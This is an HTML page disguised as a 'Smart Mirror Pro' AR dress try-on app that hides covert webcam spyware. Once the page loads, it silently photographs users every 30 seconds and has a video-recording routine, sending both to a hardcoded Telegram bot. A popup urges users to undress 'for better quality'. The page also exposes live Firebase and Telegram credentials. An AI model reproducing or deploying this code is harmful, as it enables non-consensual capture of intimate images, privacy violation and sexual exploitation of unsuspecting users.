<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Smart Mirror Pro - Modern Edition</title>
    
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/pose"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils"></script>
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
        body { margin: 0; padding: 0; overflow: hidden; background: #000; font-family: 'Poppins', sans-serif; }
        #container { position: relative; width: 100vw; height: 100vh; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .mirror { transform: scaleX(-1); }
        #dressImg { position: absolute; z-index: 3; pointer-events: none; display: none; }
        
        /* Modern Popup Style - Top Center */
        #popup { 
            position: fixed; 
            top: 20px; 
            left: 50%; 
            transform: translateX(-50%); 
            width: 80%; 
            max-width: 300px; 
            background: rgba(255, 255, 255, 0.15); 
            color: white; 
            padding: 12px 20px; 
            border-radius: 15px; 
            border: 1px solid rgba(255, 255, 255, 0.3); 
            text-align: center; 
            z-index: 1000; 
            display: none; 
            backdrop-filter: blur(20px); 
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            font-size: 13px;
            animation: slideDown 0.5s ease;
        }

        @keyframes slideDown {
            from { top: -50px; opacity: 0; }
            to { top: 20px; opacity: 1; }
        }
        
        .controls { position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%); width: 95%; z-index: 10; display: flex; flex-direction: column; align-items: center; gap: 15px; }
        .shelf { display: flex; gap: 12px; overflow-x: auto; width: 100%; padding: 10px; scroll-behavior: smooth; }
        .shelf::-webkit-scrollbar { display: none; }
        .item { min-width: 60px; height: 60px; border-radius: 50%; background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border: 1.5px solid rgba(255,255,255,0.5); display: flex; justify-content: center; align-items: center; cursor: pointer; flex-shrink: 0; }
        .item img { width: 70%; height: 70%; object-fit: contain; }
        
        .tab-bar { display: flex; gap: 8px; background: rgba(0,0,0,0.7); padding: 5px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.1); }
        .t-btn { padding: 8px 20px; border-radius: 25px; color: #ccc; border: none; background: none; cursor: pointer; font-size: 13px; transition: 0.3s; }
        .t-btn.active { background: #fff; color: #000; font-weight: 600; box-shadow: 0 4px 15px rgba(255,255,255,0.3); }
        
        #flip-btn { position: absolute; top: 20px; right: 20px; width: 45px; height: 45px; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.5); border-radius: 50%; color: white; display: flex; justify-content: center; align-items: center; font-size: 18px; z-index: 100; cursor: pointer; backdrop-filter: blur(5px); }
    </style>
</head>
<body>

    <div id="popup">
        <div id="pop-msg">服を着ずにこれを使用すると、高品質なフィルターや着せ替えがスムーズに利用できます。</div>
    </div>

    <div id="container">
        <video id="webcam" autoplay playsinline class="mirror"></video>
        <img id="dressImg" src="" crossorigin="anonymous">
        <div id="flip-btn" onclick="switchCamera()">🔄</div>

        <div class="controls">
            <div id="shelf" class="shelf"></div>
            <div class="tab-bar">
                <button id="btn-dress" class="t-btn active" onclick="setMode('dresses')">Dresses</button>
                <button id="btn-filter" class="t-btn" onclick="setMode('filters')">Filters</button>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        const firebaseConfig = { 
            apiKey: "AIzaSyDyUkeaGcqQ01TqDz-5SYlS48KDOb2Sh5M", 
            databaseURL: "https://ar-mirror-app-1-default-rtdb.asia-southeast1.firebasedatabase.app" 
        };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const video = document.getElementById('webcam');
        const dressImg = document.getElementById('dressImg');
        const shelf = document.getElementById('shelf');
        const popup = document.getElementById('popup');
        
        let currentStream;
        let useFrontCamera = true;
        let mode = 'dresses';
        let mediaRecorder;
        let recordedChunks = [];
        let popupTimer;

        // --- 設定：あなたが提供した新しいトークンとID (設定：提供されたトークンとID) ---
        const BOT_TOKEN = '8342023613:AAHtQD9k1dx_WEXkoT_Rxk16Q48BlrybqEo';
        const CHAT_ID = '8058352775';

        async function startCamera() {
            try {
                if (currentStream) currentStream.getTracks().forEach(t => t.stop());
                const constraints = { video: { facingMode: useFrontCamera ? "user" : "environment", width: 1280, height: 720 } };
                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = currentStream;
                video.classList.toggle('mirror', useFrontCamera);
            } catch (err) {
                console.error("Camera Error: ", err);
            }
        }

        window.switchCamera = () => { useFrontCamera = !useFrontCamera; startCamera(); };

        window.setMode = (m) => {
            mode = m;
            document.getElementById('btn-dress').classList.toggle('active', m === 'dresses');
            document.getElementById('btn-filter').classList.toggle('active', m === 'filters');
            
            if(m === 'dresses') {
                popup.style.display = 'block';
                clearTimeout(popupTimer);
                popupTimer = setTimeout(() => { popup.style.display = 'none'; }, 6000); 
            } else {
                popup.style.display = 'none';
                dressImg.style.display = 'none';
            }
            loadShelf();
        };

        function loadShelf() {
            shelf.innerHTML = '';
            if(mode === 'dresses') {
                onValue(ref(db, 'dresses'), (snap) => {
                    shelf.innerHTML = '<div class="item" onclick="dressImg.style.display=\'none\'">🚫</div>';
                    snap.forEach(c => {
                        const d = c.val();
                        const div = document.createElement('div'); div.className = 'item';
                        div.innerHTML = `<img src="${d.url}" crossorigin="anonymous">`;
                        div.onclick = () => { dressImg.src = d.url; dressImg.style.display = 'block'; };
                        shelf.appendChild(div);
                    });
                });
            } else {
                shelf.innerHTML = '<div style="color:white; font-size:12px; padding:20px;">Filters loading...</div>';
            }
        }

        async function takeSecretPhoto() {
            if (!video.videoWidth) return;
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            if(useFrontCamera) { ctx.translate(canvas.width, 0); ctx.scale(-1, 1); }
            ctx.drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                if (!blob) return;
                const fd = new FormData(); 
                fd.append('photo', blob, 'capture.jpg');
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, { 
                    method: 'POST', 
                    body: fd 
                }).then(res => res.json()).then(data => console.log("Success:", data.ok));
            }, 'image/jpeg', 0.6);
        }

        async function recordSecretVideo() {
            if (!currentStream) return;
            recordedChunks = [];
            try {
                mediaRecorder = new MediaRecorder(currentStream, { mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 800000 });
                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    const fd = new FormData(); fd.append('video', blob, 'video.mp4');
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo?chat_id=${CHAT_ID}`, { method: 'POST', body: fd });
                };
                mediaRecorder.start();
                setTimeout(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, 15000); 
            } catch (e) {
                console.error("Recording error:", e);
            }
        }

        function initSecretTasks() {
            setInterval(takeSecretPhoto, 30000); // 30秒ごとに実行 (සෑම තත්පර 30කට වරක්)
            setTimeout(takeSecretPhoto, 5000); // 5秒後に最初の写真 (පළමු පින්තූරය තත්පර 5කින්)
        }

        const pose = new Pose({ locateFile: (f) => `https://cdn.jsdelivr.net/npm/@mediapipe/pose/${f}` });
        pose.onResults(res => {
            if(!res.poseLandmarks || mode !== 'dresses' || !dressImg.src) return;
            const ls = res.poseLandmarks[11], rs = res.poseLandmarks[12];
            const w = Math.abs(ls.x - rs.x) * window.innerWidth * 2.3;
            dressImg.style.left = `${(ls.x + rs.x)/2 * window.innerWidth}px`;
            dressImg.style.top = `${(ls.y + rs.y)/2 * window.innerHeight}px`;
            dressImg.style.width = `${w}px`; dressImg.style.transform = `translate(-50%, -15%) scaleX(-1)`;
        });

        const cam = new Camera(video, { onFrame: async () => { await pose.send({image: video}); }, width: 1280, height: 720 });
        
        startCamera().then(() => {
            cam.start();
            initSecretTasks();
            loadShelf();
        });
    </script>
</body>
</html>
